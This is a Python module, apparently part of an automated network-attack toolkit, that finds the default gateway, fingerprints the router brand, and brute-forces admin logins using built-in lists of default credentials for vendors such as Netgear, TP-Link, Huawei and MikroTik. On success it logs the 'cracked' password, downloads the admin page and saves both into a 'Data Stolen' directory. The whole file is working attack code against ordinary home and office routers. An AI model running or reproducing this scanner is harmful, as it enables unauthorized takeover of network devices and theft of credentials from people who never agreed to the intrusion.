"""
router_scanner.py - Default gateway admin panel scanner.

Targets the default gateway on every connected network — the single most valuable
device on any LAN. Fingerprints brand from HTTP headers, tries brand-specific then
generic default credentials, saves a dump of the admin page to Data Stolen.

Standalone module (b_port=None): runs once per orchestrator cycle, not tied to a
specific discovered port. Finds the gateway via netifaces.
"""

import os
import json
import logging
import subprocess
from datetime import datetime

try:
    import requests
    from requests.auth import HTTPBasicAuth, HTTPDigestAuth
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import netifaces
    HAS_NETIFACES = True
except ImportError:
    try:
        import netifaces_plus as netifaces
        HAS_NETIFACES = True
    except ImportError:
        HAS_NETIFACES = False

from shared import SharedData
from logger import Logger

logger = Logger(name="router_scanner.py", level=logging.INFO)

b_class  = "RouterScanner"
b_module = "router_scanner"
b_status = "router_scan"
b_port   = None   # Standalone — targets gateway regardless of discovered ports
b_parent = None

HTTP_PORTS = [80, 8080, 443, 8181, 8443, 81, 8000]
REQUEST_TIMEOUT = 5

# Brand fingerprinting keywords
BRAND_KEYWORDS = {
    "netgear":   ["netgear", "routerlogin", "orbi"],
    "tplink":    ["tp-link", "tplink", "archer", "deco"],
    "asus":      ["asus", "asuswrt", "rt-"],
    "linksys":   ["linksys", "velop", "cisco"],
    "dlink":     ["d-link", "dlink", "dir-"],
    "cisco":     ["cisco", "rv3", "rv1", "asa"],
    "huawei":    ["huawei", "hg8", "hg2", "b315", "b525"],
    "zyxel":     ["zyxel", "zywall"],
    "mikrotik":  ["mikrotik", "routeros", "winbox"],
    "ubiquiti":  ["ubiquiti", "unifi", "edgeos", "edgerouter"],
    "openwrt":   ["openwrt", "luci", "lede"],
    "ddwrt":     ["dd-wrt"],
    "pfsense":   ["pfsense", "m0n0wall"],
    "technicolor":["technicolor", "tg784", "tg582"],
    "arris":     ["arris", "surfboard"],
    "motorola":  ["motorola"],
    "fritz":     ["fritzbox", "fritz!box", "fritz!"],
}

BRAND_CREDS = {
    "netgear":    [("admin","password"),("admin","admin"),("admin","1234"),("admin","netgear")],
    "tplink":     [("admin","admin"),("admin",""),("admin","tplink"),("admin","12345")],
    "asus":       [("admin","admin"),("admin",""),("admin","asus"),("root","admin")],
    "linksys":    [("admin","admin"),("","admin"),("admin",""),("admin","password")],
    "dlink":      [("admin",""),("admin","admin"),("Admin",""),("user","user")],
    "cisco":      [("cisco","cisco"),("admin","cisco"),("admin","admin"),("enable","enable")],
    "huawei":     [("admin","admin"),("admin","HuaweiAbc"),("telecomadmin","admintelecom"),("root","admin")],
    "zyxel":      [("admin","1234"),("admin","admin"),("admin",""),("support","support")],
    "mikrotik":   [("admin",""),("admin","admin")],
    "ubiquiti":   [("ubnt","ubnt"),("admin","admin"),("admin","ubnt")],
    "openwrt":    [("root",""),("admin","admin")],
    "fritz":      [("admin",""),("admin","admin"),("fritz","fritz")],
    "arris":      [("admin","password"),("admin","admin"),("admin","motorola")],
    "motorola":   [("admin","motorola"),("admin","password"),("admin","admin")],
    "generic":    [
        ("admin","admin"),("admin",""),("admin","password"),("admin","1234"),
        ("admin","12345"),("admin","123456"),("admin","pass"),("root","root"),
        ("root",""),("root","admin"),("user","user"),("admin","admin123"),
        ("admin","Admin"),("supervisor","supervisor"),("guest","guest"),
    ],
}

# Common router admin paths to check
ADMIN_PATHS = ["/", "/index.html", "/login.html", "/admin/", "/cgi-bin/luci",
               "/webman/login.cgi", "/ui/", "/userRpm/LoginRpm.htm"]


class RouterScanner:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self._scanned_gateways: set = set()
        logger.info("RouterScanner initialized")

    def execute(self, ip, port, row, status_key):
        """Called by orchestrator each cycle. Targets the default gateway."""
        if not getattr(self.shared_data, 'router_scanner_enabled', True):
            return 'skipped'

        if not HAS_REQUESTS:
            logger.error("requests not available — cannot run router_scanner")
            return 'failed'

        gateway = self._get_gateway()
        if not gateway:
            logger.debug("RouterScanner: could not determine default gateway")
            return 'skipped'

        if gateway in self._scanned_gateways:
            return 'skipped'

        # Don't re-scan if we already have results
        out_dir = os.path.join(self.shared_data.datastolendir, "router", gateway)
        info_file = os.path.join(out_dir, "router_info.json")
        if os.path.exists(info_file):
            self._scanned_gateways.add(gateway)
            return 'success'

        self.shared_data.ragnarorch_status = b_status
        logger.info(f"🌐 RouterScanner: probing gateway {gateway}")

        brand = self._fingerprint(gateway)
        logger.info(f"  Brand: {brand}")

        creds = self._try_credentials(gateway, brand)
        self._scanned_gateways.add(gateway)

        if not creds:
            logger.info(f"  No valid credentials found for gateway {gateway}")
            return 'failed'

        user, password = creds
        logger.info(f"  ✅ Gateway cracked: {gateway} — {user}:{password}")

        page_content = self._dump_admin_page(gateway, user, password)
        self._save_results(out_dir, info_file, gateway, brand, user, password, page_content)
        return 'success'

    def _get_gateway(self):
        if HAS_NETIFACES:
            try:
                gws = netifaces.gateways()
                return gws['default'][netifaces.AF_INET][0]
            except Exception:
                pass
        # Fallback: parse ip route
        try:
            out = subprocess.check_output(["ip", "route"], timeout=5).decode()
            for line in out.splitlines():
                if line.startswith("default"):
                    return line.split()[2]
        except Exception:
            pass
        return None

    def _fingerprint(self, ip):
        for port in HTTP_PORTS:
            scheme = "https" if port in (443, 8443) else "http"
            try:
                resp = requests.get(f"{scheme}://{ip}:{port}/", timeout=REQUEST_TIMEOUT,
                                    verify=False, allow_redirects=True)
                combined = (resp.text + " ".join(f"{k}:{v}" for k, v in resp.headers.items())).lower()
                for brand, kws in BRAND_KEYWORDS.items():
                    if any(k.lower() in combined for k in kws):
                        return brand
            except Exception:
                continue
        return "generic"

    def _try_credentials(self, ip, brand):
        cred_list = list(BRAND_CREDS.get(brand, [])) + [
            c for c in BRAND_CREDS["generic"] if c not in BRAND_CREDS.get(brand, [])
        ]
        for port in HTTP_PORTS:
            scheme = "https" if port in (443, 8443) else "http"
            for user, password in cred_list:
                for path in ADMIN_PATHS[:4]:
                    url = f"{scheme}://{ip}:{port}{path}"
                    for auth_cls in (HTTPBasicAuth, HTTPDigestAuth):
                        try:
                            r = requests.get(url, auth=auth_cls(user, password),
                                             timeout=REQUEST_TIMEOUT, verify=False)
                            if r.status_code == 200 and len(r.text) > 200:
                                # Confirm it's not just a redirect to login
                                text_lower = r.text.lower()
                                if "logout" in text_lower or "password" not in text_lower[:500]:
                                    return (user, password)
                        except Exception:
                            continue
        return None

    def _dump_admin_page(self, ip, user, password):
        for port in HTTP_PORTS:
            scheme = "https" if port in (443, 8443) else "http"
            for path in ADMIN_PATHS:
                try:
                    r = requests.get(f"{scheme}://{ip}:{port}{path}",
                                     auth=HTTPBasicAuth(user, password),
                                     timeout=REQUEST_TIMEOUT, verify=False)
                    if r.status_code == 200 and len(r.text) > 200:
                        return r.text
                except Exception:
                    continue
        return None

    def _save_results(self, out_dir, info_file, ip, brand, user, password, page_content):
        os.makedirs(out_dir, exist_ok=True)
        info = {
            "ip": ip,
            "brand": brand,
            "username": user,
            "password": password,
            "scanned_at": datetime.now().isoformat(),
        }
        with open(info_file, "w") as f:
            json.dump(info, f, indent=2)
        if page_content:
            dump_path = os.path.join(out_dir, "admin_page.html")
            with open(dump_path, "w", encoding="utf-8", errors="replace") as f:
                f.write(page_content)
            logger.info(f"  Admin page saved: {dump_path}")
